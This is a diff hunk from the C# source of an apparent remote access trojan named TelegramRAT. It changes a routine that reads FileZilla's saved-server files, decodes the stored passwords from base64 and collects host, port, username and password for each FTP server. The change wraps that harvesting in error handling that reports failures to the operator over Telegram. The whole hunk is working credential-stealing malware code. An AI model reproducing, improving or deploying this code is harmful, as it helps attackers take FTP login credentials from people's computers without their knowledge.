@@ -28,44 +28,56 @@ namespace TelegramRAT
             // Get data from recentserver.xml
             if (File.Exists(RecentServersPath))
             {
-                XmlDocument doc = new XmlDocument();
-                doc.Load(RecentServersPath);
-                foreach (XmlNode node in doc.GetElementsByTagName("Server"))
+                try
                 {
-                    // Get values
-                    string url = "ftp://" + node["Host"].InnerText + ":" + node["Port"].InnerText + "/";
-                    string username = node["User"].InnerText;
-                    string password = Encoding.UTF8.GetString(Convert.FromBase64String(node["Pass"].InnerText));
-                    // Add to list
-                    Dictionary<string, string> credentials = new Dictionary<string, string>
+                    XmlDocument doc = new XmlDocument();
+                    doc.Load(RecentServersPath);
+                    foreach (XmlNode node in doc.GetElementsByTagName("Server"))
                     {
-                        ["url"] = url,
-                        ["username"] = username,
-                        ["password"] = password
-                    };
-                    fzServers.Add(credentials);
+                        // Get values
+                        string url = "ftp://" + node["Host"].InnerText + ":" + node["Port"].InnerText + "/";
+                        string username = node["User"].InnerText;
+                        string password = Encoding.UTF8.GetString(Convert.FromBase64String(node["Pass"].InnerText));
+                        // Add to list
+                        Dictionary<string, string> credentials = new Dictionary<string, string>
+                        {
+                            ["url"] = url,
+                            ["username"] = username,
+                            ["password"] = password
+                        };
+                        fzServers.Add(credentials);
+                    }
+                } catch {
+                    telegram.sendText("⛔ Failed to read recentserver.xml");
                 }
             }
             // Get data from sitemanager.xml
             if (File.Exists(SiteManagerPath))
             {
-                XmlDocument doc = new XmlDocument();
-                doc.Load(SiteManagerPath);
-                foreach (XmlNode node in doc.GetElementsByTagName("Server"))
+                try
                 {
-                    // Get values
-                    string url = "ftp://" + node["Host"].InnerText + ":" + node["Port"].InnerText + "/";
-                    string username = node["User"].InnerText;
-                    string password = Encoding.UTF8.GetString(Convert.FromBase64String(node["Pass"].InnerText));
-                    // Add to list
-                    Dictionary<string, string> credentials = new Dictionary<string, string>
+                    XmlDocument doc = new XmlDocument();
+                    doc.Load(SiteManagerPath);
+                    foreach (XmlNode node in doc.GetElementsByTagName("Server"))
                     {
-                        ["url"] = url,
-                        ["username"] = username,
-                        ["password"] = password
-                    };
-                    fzServers.Add(credentials);
+                        // Get values
+                        string url = "ftp://" + node["Host"].InnerText + ":" + node["Port"].InnerText + "/";
+                        string username = node["User"].InnerText;
+                        string password = Encoding.UTF8.GetString(Convert.FromBase64String(node["Pass"].InnerText));
+                        // Add to list
+                        Dictionary<string, string> credentials = new Dictionary<string, string>
+                        {
+                            ["url"] = url,
+                            ["username"] = username,
+                            ["password"] = password
+                        };
+                        fzServers.Add(credentials);
+                    }
+                } catch
+                {
+                    telegram.sendText("⛔ Failed to read sitemanager.xml");
                 }
+                
             }
 
             return fzServers;
